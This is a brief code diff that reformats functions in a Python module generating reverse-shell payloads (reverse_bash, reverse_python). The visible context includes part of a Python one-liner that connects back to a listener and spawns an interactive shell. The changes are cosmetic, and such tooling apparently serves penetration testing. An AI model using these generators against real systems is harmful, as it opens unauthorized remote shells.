@@ -23,7 +23,9 @@ def reverse_bash(lhost: str, lport: int, *, bash_path="bash", shell_path="sh") -
     )
 
 
-def reverse_python(lhost: str, lport: int, *, py_path="python3", shell_path="sh") -> str:
+def reverse_python(
+    lhost: str, lport: int, *, py_path="python3", shell_path="sh"
+) -> str:
     """Connect back and create a command shell via Python"""
     py_path = py_path or 'python3'
     shell_path = shell_path or '/bin/sh'
@@ -39,5 +41,5 @@ def reverse_python(lhost: str, lport: int, *, py_path="python3", shell_path="sh"
                     f'subprocess.call(["{shell_path}","-i"])',
                 ]
             )
-        )
+        ),
     )
